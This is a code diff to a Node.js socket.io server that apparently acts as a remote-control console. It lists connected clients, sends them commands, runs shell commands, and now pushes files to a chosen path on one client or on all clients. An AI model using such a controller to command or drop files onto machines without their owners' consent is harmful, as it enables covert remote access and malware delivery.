@@ -2,6 +2,7 @@ const express = require('express');
 const socket = require('socket.io');
 const shell = require('shelljs');
 const readline = require('readline');
+const dl = require('delivery');
 // const chalk = require('chalk'); Color para la consola, para linux.
 
 var app = express();
@@ -41,7 +42,6 @@ function newConnection(socket){
 function terminal(){
     rl.question('Command: ', function (answer) {
         if (answer == 'exit') return rl.close(); //closing RL and returning from function.
-
         executeCommand(answer);
         terminal();
     });
@@ -49,8 +49,11 @@ function terminal(){
 
 function executeCommand(command){
     var words = command.split(" ");
+    var clientIndex = words[1];
 
-    var sendLine = command.split('"');
+    var quotes = command.split('"');
+    //console.log(quotes[1], quotes[3], quotes[5]);
+
 
     if(words[0] == "list"){
         showClients();
@@ -58,11 +61,23 @@ function executeCommand(command){
     else if(words[0] == "cls"){
         cls();
     }
-    else if(words[0] == "send"){ // Ejemplo de comando: send -number- -command-
-        sendCommand(words[1], sendLine[1]);
+    else if(words[0] == "send"){ // Example: send number "command"
+        sendCommand(clientIndex, quotes[1]);
     }
     else if(words[0] == "shell"){
-        shell.exec(sendLine[1]);
+        shell.exec(quotes[1]);
+    }
+    else if (words[0] == "sendfile"){ // Example: sendfile number "C:/etc/example.jpg" "root/users/"
+        var localPath = quotes[1];
+        var temp = localPath.split('/');
+        var fileName = temp[temp.length-1];
+        var targetPath = quotes[3];
+
+        console.log(clientIndex, localPath, fileName, targetPath);
+        sendFile(clientIndex, localPath, fileName, targetPath); 
+    }
+    else if (words[0] == "getfile"){
+        getFile();
     }
     else{
         console.log("Command not found");
@@ -101,6 +116,35 @@ function find(clientTag){
 
 function cls(){
     console.log('\033c');
+}
+
+function sendFile(clientIndex, localPath, fileName, targetPath){
+
+    if(clientIndex == "all"){
+        var delivery = dl.listen(io.sockets);
+        io.sockets.emit('clientWritePath', targetPath);
+    }
+    else{
+        var delivery = dl.listen(clients[clientIndex]);
+        clients[clientIndex].emit('clientWritePath', targetPath)
+    }
+    
+    delivery.connect();
+
+    delivery.on('delivery.connect',function(delivery){
+        delivery.send({
+            name: fileName,
+            path : localPath
+        });
+
+        delivery.on('send.success',function(file){
+            console.log('File successfully sent to client!');
+        });
+    });
+}
+
+function getFile(){
+
 }
 
 cls();
